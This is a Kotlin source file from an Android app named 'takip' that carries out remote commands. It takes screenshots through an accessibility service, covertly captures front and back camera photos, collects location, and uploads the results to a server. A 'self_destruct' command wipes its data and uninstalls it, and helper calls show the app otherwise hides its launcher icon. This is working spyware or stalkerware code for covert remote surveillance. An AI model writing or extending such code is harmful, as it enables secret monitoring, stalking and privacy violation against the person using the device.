package com.takip.app.service

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.takip.app.api.ApiClient
import com.takip.app.collector.CameraCaptureHelper
import com.takip.app.collector.LocationCollector
import com.takip.app.util.AppHider
import com.takip.app.util.PrefsManager
import kotlinx.coroutines.suspendCancellableCoroutine
import org.json.JSONObject
import java.io.File
import kotlin.coroutines.resume

object CommandExecutor {
    private const val TAG = "CommandExecutor"

    suspend fun execute(context: Context, token: String, commandId: String, type: String) {
        fun complete(status: String, extra: JSONObject.() -> Unit = {}) {
            val body = JSONObject().apply {
                put("status", status)
                extra()
            }
            ApiClient.completeCommand(token, commandId, body)
        }

        try {
            when (type) {
                "screenshot" -> {
                    val bytes = takeScreenshotBytes()
                    if (bytes == null) {
                        complete("failed") { put("errorMsg", "Ekran görüntüsü alınamadı. Erişilebilirlik açık olmalı.") }
                        return
                    }
                    val file = File(context.cacheDir, "cmd_screen_$commandId.jpg")
                    file.writeBytes(bytes)
                    val url = ApiClient.uploadMediaReturnUrl(token, file, "screenshot").getOrNull()
                    if (url != null) {
                        complete("completed") { put("resultUrl", url) }
                    } else {
                        complete("failed") { put("errorMsg", "Ekran görüntüsü yüklenemedi") }
                    }
                }
                "camera_front", "camera_back" -> {
                    val front = type == "camera_front"
                    val file = CameraCaptureHelper.capturePhoto(context, useFrontCamera = front)
                    if (file == null) {
                        complete("failed") { put("errorMsg", "Kamera açılamadı") }
                        return
                    }
                    val mediaType = if (front) "camera_front" else "camera_back"
                    val url = ApiClient.uploadMediaReturnUrl(token, file, mediaType).getOrNull()
                    if (url != null) {
                        complete("completed") { put("resultUrl", url) }
                    } else {
                        complete("failed") { put("errorMsg", "Fotoğraf yüklenemedi") }
                    }
                }
                "location" -> {
                    val locations = LocationCollector.collect(context)
                    if (locations.length() == 0) {
                        complete("failed") { put("errorMsg", "Konum alınamadı") }
                        return
                    }
                    ApiClient.uploadLocations(token, locations)
                    val loc = locations.getJSONObject(0)
                    complete("completed") {
                        put("latitude", loc.getDouble("latitude"))
                        put("longitude", loc.getDouble("longitude"))
                        if (loc.has("accuracy")) put("accuracy", loc.getDouble("accuracy"))
                    }
                }
                "self_destruct" -> {
                    complete("completed") {}
                    Handler(Looper.getMainLooper()).postDelayed({
                        try {
                            AppHider.showLauncherIcon(context)
                            context.stopService(Intent(context, MonitoringService::class.java))
                            PrefsManager.clear()
                            val intent = Intent(Intent.ACTION_DELETE).apply {
                                data = Uri.parse("package:${context.packageName}")
                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                            }
                            context.startActivity(intent)
                        } catch (e: Exception) {
                            Log.e(TAG, "Self destruct hatası", e)
                        }
                    }, 800)
                }
                else -> complete("failed") { put("errorMsg", "Bilinmeyen komut: $type") }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Komut hatası $type", e)
            complete("failed") { put("errorMsg", e.message ?: "Hata") }
        }
    }

    private suspend fun takeScreenshotBytes(): ByteArray? = suspendCancellableCoroutine { cont ->
        val service = TakipAccessibilityService.instance
        if (service == null) {
            cont.resume(null)
            return@suspendCancellableCoroutine
        }
        service.takeScreenCapture { bytes ->
            if (cont.isActive) cont.resume(bytes)
        }
    }
}
